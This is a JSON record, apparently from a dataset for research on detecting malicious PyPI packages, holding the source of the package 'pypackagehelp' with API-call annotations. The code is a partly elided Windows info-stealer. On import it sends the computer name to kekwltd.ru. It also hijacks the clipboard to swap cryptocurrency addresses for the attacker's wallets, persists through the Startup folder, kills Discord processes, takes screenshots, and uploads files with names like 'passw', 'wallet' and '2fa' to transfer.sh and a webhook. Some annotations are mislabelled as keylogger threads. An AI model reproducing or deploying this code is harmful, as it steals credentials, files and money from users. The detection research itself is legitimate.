{
  "metadata": {
    "package_name": "pypackagehelp-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/pypackagehelp-1.0.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pypackagehelp-1.0.0/pypackagehelp-1.0.0/pypackagehelp/__init__.py",
      "code_snippets": [
        {
          "snippet": "import requests\nimport os\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Initial exfiltration of PC username\nhttpx.post(\"https://kekwltd.ru/relay/download\", json={\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    })\n\n# Malicious pip install to ensure dependencies for further malicious actions\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# Malicious configuration for exfiltration and crypto wallet hijacking\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg': [ ... ]\n}\n\n# Malicious class for clipboard hijacking (crypto wallet address replacement)\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other crypto address regexes)\n        except:\n            pass\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# Malicious class for browser data, token, and file exfiltration\nclass bc_initial_func:\n    def __init__(self):\n        self.discord_webhook = __config__['yourwebhookurl']\n        self.hide = __config__[\"hide\"]\n        self.pingtype = __config__[\"pingtype\"]\n        self.pingonrun = __config__[\"ping\"]\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = __config__[\"startup\"]\n        self.fake_error = __config__[\"fake_error\"]\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        # ... (system info gathering)\n        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        self.regex_webhook_dsc = \".ru/relay\"\n        self.chrmrgx = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n        self.bc_id = []\n        self.sep = os.sep\n        self.robloxcookies = []\n        self.chrome_key = None\n        os.makedirs(self.dir, exist_ok=True)\n\n    def startupkekw(self):\n        if self.startupexe == \"yes\":\n            startup_path = os.getenv(\"appdata\") + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n            if os.path.exists(startup_path + argv[0]):\n                os.remove(startup_path + argv[0])\n                copy2(argv[0], startup_path)\n            else:\n                copy2(argv[0], startup_path)\n\n    async def kill_process_id(self):\n        bllist = __config__['blprggg']\n        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:\n            bllist.append(i)\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in bllist):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n\n    def steal_token(self):\n        # Steals Discord and browser tokens from local files and verifies them\n        # ... (see original for full code)\n        pass\n\n    def steal_passwords(self):\n        # Steals browser passwords and writes to file\n        pass\n\n    def steal_cookies(self):\n        # Steals browser cookies and writes to file\n        pass\n\n    def steal_history(self):\n        # Steals browser history and writes to file\n        pass\n\n    def steal_screen(self):\n        image = ImageGrab.grab(\n            bbox=None,\n            include_layered_windows=False,\n            all_screens=True,\n            xdisplay=None\n        )\n        image.save(self.dir + \"\\\\Screenshot.png\")\n        image.close()\n\n    def finished_bc(self):\n        # Zips up all stolen data and exfiltrates to attacker's webhook\n        _zipfile = ntpath.join(self.appdata, f'BC-[{os.getlogin()}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json={...})\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# Malicious code for searching and exfiltrating files with sensitive keywords\n# and uploading to attacker's server\n\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\nbc_create_files = []\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\n# Malicious main execution\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bc_initial_func().init())\n\n# Malicious browser data stealer and uploader\n# (getPassw, getCookie, grabb_GatherAll, upload, etc.)\n# ... (see original for full code)\n\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\n\ngrabb_GatherAll()\nDETECTED = False # Trust(Cookies)\nif not DETECTED:\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"bc_checking\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
          "triple_sequences": [
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://kekwltd.ru/relay/download",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Send PC username to remote server",
              "intention_id": "send_username_server"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "COMPUTERNAME",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install multiple Python packages",
              "intention_id": "install_multiple_python_packages"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data",
              "object_description": "Regular expression and clipboard content",
              "object_id": "regex_clipboard_content",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_btc",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'^0x[a-fA-F0-9]{40}$', clipboard_data",
              "object_description": "Regular expression and clipboard content",
              "object_id": "regex_clipboard_content",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_eth",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "localappdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Access local application data directory",
              "intention_id": "access_local_appdata"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "appdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Access roaming application data directory",
              "intention_id": "access_roaming_appdata"
            },
            {
              "action_api": "mkdtemp()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Create temporary directory",
              "intention_id": "create_temporary_directory"
            },
            {
              "action_api": "gettempdir()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Collect temporary directory path",
              "intention_id": "collect_temp_directory_path"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "self.dir, exist_ok=True",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "appdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Access roaming application data directory",
              "intention_id": "access_roaming_appdata"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "startup_path + argv[0]",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Determine presence of local file",
              "intention_id": "determine_local_file_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "startup_path + argv[0]",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "argv[0], startup_path",
              "object_description": "Executable file and startup path",
              "object_id": "executable_startup_path",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "",
              "object_description": "User process",
              "object_id": "user_process",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "proc.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "",
              "object_description": "User process",
              "object_id": "user_process",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "",
              "object_description": "Screen region",
              "object_id": "screen_region",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "image.save()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "self.dir + \"\\Screenshot.png\"",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "image.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.appdata, f'BC-[{os.getlogin()}].zip'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "_zipfile, \"w\", zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "ntpath.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Directory tree generation",
              "action_id": "path_special_operations",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "ntpath.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "ntpath.join(dirname, filename)",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "zipped_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "absname, arcname",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "zipped_file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "_zipfile, 'rb'",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.discord_webhook, files={'upload_file': f}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "_zipfile",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "pathF",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "pathF + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "pathF + \"/\" + file, mode='rb'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for reading",
              "intention_id": "open_file_reading"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "https://transfer.sh/, files=files",
              "object_description": "File transfer service URL",
              "object_id": "transfer_service_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "path + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "path + \"/\" + file",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=bc_create_file, args=[patt, key_wordsFiles]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=auto_copy_wallet().run",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "auto.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            }
          ]
        }
      ]
    }
  ]
}